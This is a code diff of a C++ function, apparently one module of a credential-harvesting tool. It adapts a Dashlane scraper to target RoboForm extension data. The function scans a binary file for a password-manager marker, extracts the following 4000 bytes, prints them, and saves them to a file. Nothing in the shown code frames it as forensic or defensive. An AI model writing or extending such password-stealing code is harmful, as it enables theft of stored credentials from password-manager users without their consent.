@@ -2,9 +2,9 @@
 #include <iostream>
 #include <fstream>
 #include <vector>
-#include "../core/saveFile.h"
+#include "../../core/saveFile.h"
 
-int getCredsdashlaneEntries(std::string filename) {
+int getCredsroboformplugin(std::string filename) {
     std::ifstream file(filename, std::ios::binary);
 
     if (!file.is_open()) {
@@ -12,7 +12,7 @@ int getCredsdashlaneEntries(std::string filename) {
         return 1;
     }
 
-    std::string searchSequence = "{\"addresses\":[";
+    std::string searchSequence = "\"Main\\";
     std::vector<char> foundData;
 
     while (!file.eof()) {
@@ -22,9 +22,9 @@ int getCredsdashlaneEntries(std::string filename) {
         if (c == searchSequence[foundData.size()]) {
             foundData.push_back(c);
             if (foundData.size() == searchSequence.size()) {
-                // We found the search sequence, now collect the next 5000 binary characters
+                // We found the search sequence, now collect the next 4000 binary characters
                 std::vector<char> extractedData;
-                for (int i = 0; i < 5000; i++) {
+                for (int i = 0; i < 4000; i++) {
                     file.get(c);
                     if (file.eof()) {
                         break;
@@ -36,7 +36,7 @@ int getCredsdashlaneEntries(std::string filename) {
                 std::string utf8ExtractedData(extractedData.begin(), extractedData.end());
                 std::cout << "Pattern Data: " + utf8ExtractedData << std::endl;  // Add a newline
 
-                //Save into file
+                //Save data into a file
                 saveFile(utf8ExtractedData);
 
                 // Clear the foundData vector to search for the next occurrence
